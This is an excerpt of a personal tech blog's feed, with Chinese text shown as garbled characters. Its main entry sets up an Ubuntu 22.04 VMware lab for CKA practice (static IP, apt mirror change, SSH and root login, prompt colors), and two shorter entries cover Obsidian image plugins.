    <title>ã€è™šæ‹Ÿæœºã€‘(202211) VMware16.2.2ä¸­åˆ›å»ºubuntu22.04.1è™šæ‹Ÿæœº+ä¿®æ”¹é™æ€ip+æ¢æº+mobaxtermè¿œç¨‹è¿æ¥+ä¿®æ”¹å‘½ä»¤æç¤ºç¬¦é¢œè‰²(ckaè€ƒè¯•è™šæ‹Ÿæœºæ­å»º)</title>
    <link href="/2022/11/21/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/"/>
    <url>/2022/11/21/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91(202211)%20VMware16.2.2%E4%B8%AD%E5%88%9B%E5%BB%BAubuntu22.04.1%E8%99%9A%E6%8B%9F%E6%9C%BA+%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81ip+%E6%8D%A2%E6%BA%90+mobaxterm%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5+%E4%BF%AE%E6%94%B9%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6%E9%A2%9C%E8%89%B2(cka%E8%80%83%E8%AF%95%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%90%AD%E5%BB%BA)/</url>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p>é•œåƒï¼š<a href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/">https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/ubuntu-22.04.1-desktop-amd64.isohttps://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/22.04.1/</a>    </p><p>vmwareï¼š16.2.2</p><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li>åˆ›å»ºè™šæ–°çš„è™šæ‹Ÿæœº</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185354.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185445.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185633.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185651.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185750.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185804.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185816.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185832.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185917.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185842.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121185935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190003.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190013.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190027.png"></p><p>é…ç½®å®Œå‚æ•°ä¹‹åï¼Œç³»ç»Ÿå¼€å§‹å®‰è£…ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190802.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121190938.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191146.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191231.png"></p><p>æ­¤å¤„å¯ä»¥æŠŠDownload updates while installing ubuntu å…³æ‰ï¼Œä¸å…³çš„è¯ï¼Œç½‘ä¸å¥½ï¼Œä¼šå¯¼è‡´è™šæ‹Ÿæœºå®‰è£…å¡åœ¨æŸä¸€ä¸ªåœ°æ–¹ä¸€åŠ¨ä¸åŠ¨</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191417.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191443.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191533.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121191722.png"></p><p>å¼€å§‹äº†æ¼«é•¿çš„å®‰è£…<br>19:17-19:47  å®‰è£…å¥½å•¦</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194733.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121194935.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195042.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121195104.png"></p><h2 id="è¿›é˜¶1"><a href="#è¿›é˜¶1" class="headerlink" title="è¿›é˜¶1"></a>è¿›é˜¶1</h2><h3 id="dnsæ— æ³•è§£æ"><a href="#dnsæ— æ³•è§£æ" class="headerlink" title="dnsæ— æ³•è§£æ"></a>dnsæ— æ³•è§£æ</h3><p>å‘ç°è™šæ‹Ÿæœºè§£æä¸äº†åŸŸåï¼ŒåŸŸåä¸èƒ½è®¿é—®ï¼Œipå¯ä»¥è®¿é—®(ipæ˜¯é€šè¿‡ä¸€å°æ­£å¸¸çš„è™šæ‹Ÿæœºè§£æå‡ºæ¥çš„ï¼Œä¸‹é¢ç¬¬2å¼ å›¾)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220718.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121220751.png"></p><p>æŸ¥çœ‹ç½‘å…³ï¼Œpingç½‘å…³æ˜¯æ²¡æœ‰é—®é¢˜çš„</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121221838.png"></p><p>æŸ¥çœ‹&#x2F;etc&#x2F;resolv.confæ–‡ä»¶ï¼Œå‘ç°æ²¡æœ‰å¯ç”¨çš„dnsæœåŠ¡å™¨<br>åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­æ·»åŠ dnsæœåŠ¡å™¨çš„è¯ï¼Œæ¯æ¬¡é‡å¯å°±ä¼šè¢«åˆ·æˆä¹‹å‰çš„é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231402.png"></p><p>æˆ‘ä»¬é‡‡ç”¨ä¿®æ”¹é™æ€ipçš„åŠæ³•ï¼Œé¡ºä¾¿æŠŠdnsåŠ ä¸Š</p><h3 id="ä¿®æ”¹é™æ€ip"><a href="#ä¿®æ”¹é™æ€ip" class="headerlink" title="ä¿®æ”¹é™æ€ip"></a>ä¿®æ”¹é™æ€ip</h3><p>æŸ¥çœ‹ç½‘å¡é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230356.png"></p><p>è¿™æ˜¯æ²¡æœ‰ä¿®æ”¹ä¹‹å‰çš„ç½‘å¡é…ç½®</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230424.png"></p><p>ä¿®æ”¹&#x2F;etc&#x2F;netplan&#x2F;01-network-manager-all.yamlæ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230443.png"></p><p>æ‰§è¡Œï¼š</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">netplan <span class="hljs-built_in">apply</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121230608.png"></p><p>æ³¨é‡Šæ‰renderer<br>(å¦‚æœæ²¡åŠ rendererä¹ŸæŠ¥è¿™ä¸ªé”™ï¼Œå†æ¬¡æ‰§è¡Œnetplan applyå°±okäº†)</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231048.png"></p><p>æŸ¥çœ‹ipåœ°å€ï¼Œå·²ç»æˆåŠŸæ›´æ”¹~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231118.png"></p><p>å†æ¬¡pingåŸŸåï¼Œå·²ç»æ²¡æœ‰é—®é¢˜å•¦~</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231237.png"></p><p>yamlæ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@ubuntu-22:~<span class="hljs-comment"># cat /etc/netplan/01-network-manager-all.yaml</span><br>network:<br>  ethernets:<br>    ens33:<br>      dhcp4: no<br>      dhcp6: no<br>      addresses:<br>        - 192.168.1.100/24<br>      routes:<br>        - to: default<br>          via: 192.168.1.2<br>      nameservers:<br>        addresses:<br>          - 114.114.114.114<br>          - 8.8.8.8<br>  version: 2<br>  <span class="hljs-comment">#renderer: networkd</span><br><br></code></pre></td></tr></table></figure><h3 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h3><p>æƒ³è¦ä¸‹è½½ä¸€ä¸ªvimï¼Œå‘ç°ä¸‹è½½ä¸äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121231937.png"></p><p>æ¢æºæ“ä½œæ¥ä¸€æ³¢</p><p>Ubuntu çš„è½¯ä»¶æºé…ç½®æ–‡ä»¶æ˜¯ &#x2F;etc&#x2F;apt&#x2F;sources.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>å¤‡ä»½åŸå§‹æºæ–‡ä»¶source.list <br>sudo <span class="hljs-built_in">cp</span> /etc/apt/sources.list /etc/apt/sources.list.bak<br> <br>ä¿®æ”¹æºæ–‡ä»¶sources.list  ä¸­ç§‘å¤§ubuntu 22.04é•œåƒ<br>sudo <span class="hljs-built_in">cat</span> &lt;&lt; <span class="hljs-string">EOF &gt; /etc/apt/sources.list</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-updates main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-backports main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-security main restricted universe multiverse</span><br><span class="hljs-string">deb https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">deb-src https://mirrors.ustc.edu.cn/ubuntu/ jammy-proposed main restricted universe multiverse</span><br><span class="hljs-string">EOF</span><br><br><br>apt update<br></code></pre></td></tr></table></figure><p>updateä¹‹åï¼Œå¯ä»¥é¡ºç•…ä¸‹è½½vimäº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121232236.png"></p><h2 id="è¿›é˜¶2"><a href="#è¿›é˜¶2" class="headerlink" title="è¿›é˜¶2"></a>è¿›é˜¶2</h2><h3 id="è¿œç¨‹è¿æ¥"><a href="#è¿œç¨‹è¿æ¥" class="headerlink" title="è¿œç¨‹è¿æ¥"></a>è¿œç¨‹è¿æ¥</h3><h4 id="æ™®é€šç”¨æˆ·è¿æ¥"><a href="#æ™®é€šç”¨æˆ·è¿æ¥" class="headerlink" title="æ™®é€šç”¨æˆ·è¿æ¥"></a>æ™®é€šç”¨æˆ·è¿æ¥</h4><p>ubuntu  éƒ½åŸç”Ÿæœ‰äº†sshå®¢æˆ·ç«¯ï¼Œå¯ä»¥é€šè¿‡ssh å‘½ä»¤æ£€éªŒ.</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234308.png"></p><p>è¿œç¨‹è¿æ¥çš„æœåŠ¡å™¨ç«¯æ²¡æœ‰è‡ªå¸¦ï¼Œéœ€è¦è‡ªè¡Œå®‰è£…ï¼Œå‘½ä»¤ä¸ºï¼š</p><p>sudo apt install openssh-server</p><p>æ£€æŸ¥sshæ˜¯å¦æˆåŠŸå¯åŠ¨</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"> <span class="hljs-regexp">/etc/i</span>nit.d/ssh status<br> systemctl status ssh<br>ps -e | <span class="hljs-keyword">grep</span> sshd<br></code></pre></td></tr></table></figure><p>è¿œç¨‹è¿æ¥ï¼Œå¯ä»¥æˆåŠŸè¿æ¥</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ssh</span> username<span class="hljs-variable">@ip</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯cmdçš„è¿œç¨‹è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233518.png"></p><p>è¿™ä¸ªæ˜¯mobaxtermçš„è¿œç¨‹è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233608.png"></p><h4 id="rootè¿æ¥"><a href="#rootè¿æ¥" class="headerlink" title="rootè¿æ¥"></a>rootè¿æ¥</h4><p>åˆšåˆšæ˜¯æ™®é€šç”¨æˆ·çš„è¿æ¥ï¼Œæ­¤æ—¶rootç”¨æˆ·è¿˜æ˜¯æ— æ³•è¿æ¥</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233654.png"></p><p>Ubuntuä¸­SSHæœåŠ¡å®‰è£…å®ŒæˆåæŸ¥çœ‹æ˜¯å¦å…è®¸rootç”¨æˆ·ç™»é™†ï¼Œè‹¥ä¸å…è®¸åˆ™æ— æ³•è¿œç¨‹ç™»é™†rootç”¨æˆ·ï¼Œéœ€è¦ä¿®æ”¹é…ç½®</p><p>æ‰“å¼€â€œ&#x2F;etc&#x2F;ssh&#x2F;sshd_configâ€</p><p>sudo vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config</p><p>æ‰¾åˆ°å¹¶ç”¨#æ³¨é‡Šæ‰è¿™è¡Œï¼šPermitRootLogin prohibit-password</p><p>æŸ¥çœ‹æ˜¯å¦æœ‰â€œPermitRootLogin yesâ€æ–°å»ºä¸€è¡Œ æ·»åŠ ï¼šPermitRootLogin yes</p><p>é‡å¯æœåŠ¡</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/i</span>nit.d/ssh restart<br>sudo systemctl restart ssh<br></code></pre></td></tr></table></figure><p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯è¿ä¸ä¸Š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121233948.png"></p><h4 id="ä¿®æ”¹rootå¯†ç "><a href="#ä¿®æ”¹rootå¯†ç " class="headerlink" title="ä¿®æ”¹rootå¯†ç "></a>ä¿®æ”¹rootå¯†ç </h4><p>Ubuntuçš„ é»˜è®¤rootå¯†ç æ˜¯éšæœºçš„ï¼Œå³æ¯æ¬¡å¼€æœºéƒ½æœ‰ä¸€ä¸ªæ–°çš„rootå¯†ç ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ç»ˆç«¯è¾“å…¥å‘½ä»¤ sudo passwdï¼Œç„¶åè¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ï¼Œ enterï¼Œ</p><p>ç»ˆç«¯ä¼šæç¤ºæˆ‘ä»¬è¾“å…¥æ–°çš„å¯†ç å¹¶ç¡®è®¤ï¼Œæ­¤æ—¶çš„å¯†ç å°±æ˜¯rootæ–°å¯†ç ã€‚ä¿®æ”¹æˆåŠŸåï¼Œè¾“å…¥å‘½ä»¤ su rootï¼Œå†è¾“å…¥æ–°çš„å¯†ç å°±okäº†ã€‚</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234148.png"></p><p>å†æ¬¡ä½¿ç”¨rootè¿æ¥ï¼Œå‘ç°å°±å¯ä»¥æˆåŠŸè¿æ¥äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221121234119.png"></p><h2 id="è¿›é˜¶3"><a href="#è¿›é˜¶3" class="headerlink" title="è¿›é˜¶3"></a>è¿›é˜¶3</h2><h3 id="ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²"><a href="#ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²" class="headerlink" title="ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²"></a>ä¿®æ”¹ç»ˆç«¯å‘½ä»¤æç¤ºç¬¦é¢œè‰²</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim ~/.bashrc<br>PS1=<span class="hljs-string">&#x27;\[\e[32;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment"># green</span><br>PS1=<span class="hljs-string">&#x27;\[\e[34;40m\][\u@\h \W]\$\[\e[0m\] &#x27;</span>  <span class="hljs-comment">#blue</span><br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20221128220437.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç»ˆç«¯å·²ç»å˜æˆäº†ç»¿è‰²ã€‚è¯¦ç»†è¯´æ˜å¯ä»¥å‚è€ƒé™„ä»¶çš„èµ„æ–™ã€‚</p><h2 id="è¿›é˜¶4"><a href="#è¿›é˜¶4" class="headerlink" title="è¿›é˜¶4"></a>è¿›é˜¶4</h2><h3 id="æ›¿æ¢gnomeæ¡Œé¢ä¸ºKDE-Plasmaæ¡Œé¢"><a href="#æ›¿æ¢gnomeæ¡Œé¢ä¸ºKDE-Plasmaæ¡Œé¢" class="headerlink" title="æ›¿æ¢gnomeæ¡Œé¢ä¸ºKDE Plasmaæ¡Œé¢"></a>æ›¿æ¢gnomeæ¡Œé¢ä¸ºKDE Plasmaæ¡Œé¢</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo add-apt-repository ppa:kubuntu-ppa/backports<br>sudo apt update<br><br>sudo  apt install  kubuntu-desktop<br></code></pre></td></tr></table></figure><p>gnomeæ¡Œé¢ä½¿ç”¨çš„æ˜¯GDM3<br>plasmaæ¡Œé¢ä½¿ç”¨çš„æ˜¯SDDM</p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://blog.csdn.net/xiangxianghehe/article/details/122856771">Ubuntu 22.04æ¢å›½å†…æº æ¸…åæº é˜¿é‡Œæº ä¸­ç§‘å¤§æº 163æº</a><br><a href="https://blog.csdn.net/howiecode/article/details/120457571">ubuntué¦–æ¬¡SSHä½¿ç”¨rootè´¦æˆ·è¿œç¨‹ç™»å½•æ•™ç¨‹</a><br><a href="https://blog.csdn.net/weixin_42072280/article/details/112536544?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166964433816782429786434%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166964433816782429786434&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-2-112536544-null-null.nonecase&utm_term=%E7%BB%88%E7%AB%AF&spm=1018.2226.3001.4450"># Xshell Linux centOSå‘½ä»¤æç¤ºç¬¦æ”¹é¢œè‰²</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ubuntu</tag>
      
      <tag>cka</tag>
      
      <tag>net</tag>
      
      <tag>vmware</tag>
      
      <tag>mobaxterm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘03.obsidianä¸­å¦‚ä½•é…ç½®å›¾åºŠï¼Ÿæ’ä»¶ï¼šImage auto upload Plugin</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9103.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E5%9B%BE%E5%BA%8A%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AImage%20auto%20upload%20Plugin/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9103.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E9%85%8D%E7%BD%AE%E5%9B%BE%E5%BA%8A%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9AImage%20auto%20upload%20Plugin/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åˆšåˆšä»typoraè½¬åˆ°obsidianï¼Œä¹‹å‰åœ¨typoraç”¨çš„æ­é…æ˜¯ï¼šPicGo +typora + GitHubï¼Œç°åœ¨æ¢æˆäº†PicGo +obsidian+ GitHubã€‚</p><p>å…³äºpicgoå’Œgithubå›¾åºŠçš„é…ç½®å‚è€ƒæˆ‘çš„å¦ä¸€ç¯‡åšæ–‡ï¼š<br><a href="https://blog.csdn.net/weixin_42072280/article/details/119543816?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166652653016800180624753%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166652653016800180624753&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-4-119543816-null-null.nonecase&utm_term=%E5%9B%BE%E5%BA%8A&spm=1018.2226.3001.4450">ã€å®ç”¨å·¥å…·ã€‘PicGo +typora + GitHub æ­å»ºä¸ªäººå›¾åºŠå·¥å…· è§£å†³typoraä¸­çš„markdownå›¾ç‰‡è‡ªåŠ¨ä¸Šä¼ </a></p><h2 id="obsidiané…ç½®æµç¨‹"><a href="#obsidiané…ç½®æµç¨‹" class="headerlink" title="obsidiané…ç½®æµç¨‹"></a>obsidiané…ç½®æµç¨‹</h2><p>æ‰“å¼€ Obsidian ï¼šè®¾ç½® &#x3D;ã€‹ ç¬¬ä¸‰æ–¹æ’ä»¶ &#x3D;ã€‹ å…³é—­å®‰å…¨æ¨¡å¼ &#x3D;ã€‹ æµè§ˆç¤¾åŒºæ’ä»¶</p><p><img src="https://img-blog.csdnimg.cn/b0041e07bd214dd7bb9eef7042f2a4a1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å®‰è£…åæ‰“å¼€é€‰é¡¹ï¼Œé»˜è®¤ä»€ä¹ˆéƒ½ä¸è¦æ”¹ã€‚<br><img src="https://img-blog.csdnimg.cn/3739cac735654d3e84ed774f3d382242.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ–°å»ºæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶é‡Œé¢ç²˜è´´å›¾ç‰‡ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå·²ç»æˆåŠŸä¸Šä¼ åˆ°å›¾åºŠäº†~<br><img src="https://img-blog.csdnimg.cn/8e511f2a281b462c9c75809a6b448b1a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¤§åŠŸå‘Šæˆï¼</p>]]></content>
    
    
    <categories>
      
      <category>obsidian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>obsidian</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€obsidianç³»åˆ—ã€‘02.obsidianä¸­å¦‚ä½•å®šä¹‰é™„ä»¶(eg.å›¾ç‰‡)ä½ç½®ï¼Ÿæ’ä»¶ï¼šcustom attachment location</title>
    <link href="/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9102.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E9%99%84%E4%BB%B6(eg.%E5%9B%BE%E7%89%87)%E4%BD%8D%E7%BD%AE%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Acustom%20attachment%20location/"/>
    <url>/2022/10/23/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9102.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E5%AE%9A%E4%B9%89%E9%99%84%E4%BB%B6(eg.%E5%9B%BE%E7%89%87)%E4%BD%8D%E7%BD%AE%EF%BC%9F%E6%8F%92%E4%BB%B6%EF%BC%9Acustom%20attachment%20location/</url>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>æˆ‘æƒ³è®©æ’å…¥çš„å›¾ç‰‡æ”¾åˆ°ç›¸å¯¹ä½ç½®ä¸‹ï¼Œè¿™æ ·æ›´æ–¹ä¾¿æŸ¥æ‰¾å›¾ç‰‡ï¼Œè€Œä¸”åœ¨ç§»åŠ¨æ–‡ä»¶å¤¹æˆ–è€…æ¢ç”µè„‘çš„æ—¶å€™ï¼Œä¹Ÿä¸ä¼šä¸¢å¤±å›¾ç‰‡ã€‚</p><p>ç›®çš„ï¼šå®ç°ä¸€ä¸ªç±»ä¼¼äºtyporaçš„assetsæ–‡ä»¶å¤¹å­˜æ”¾å›¾ç‰‡ã€‚</p><p>ä¸‹å›¾ä¸ºtyporaçš„å›¾åƒæ–‡ä»¶ä½ç½®è®¾ç½®ï¼š<br><img src="https://img-blog.csdnimg.cn/b055d069b70c4be7824392e707cf9462.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æ“ä½œæµç¨‹"><a href="#æ“ä½œæµç¨‹" class="headerlink" title="æ“ä½œæµç¨‹"></a>æ“ä½œæµç¨‹</h2><p> æ‰“å¼€æ’ä»¶<br>å·¦ä¸‹è§’è®¾ç½® â€“&gt; ç¬¬ä¸‰æ–¹æ’ä»¶ â€“&gt; ç¤¾åŒºæ’ä»¶å¸‚åœº<br><img src="https://img-blog.csdnimg.cn/ef5e86145fb746b89b3b9b41c29eaa56.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœç´¢ï¼šcustom attachment location<br><img src="https://img-blog.csdnimg.cn/27c8d389b84a4d8d929e90f74da582c7.png" 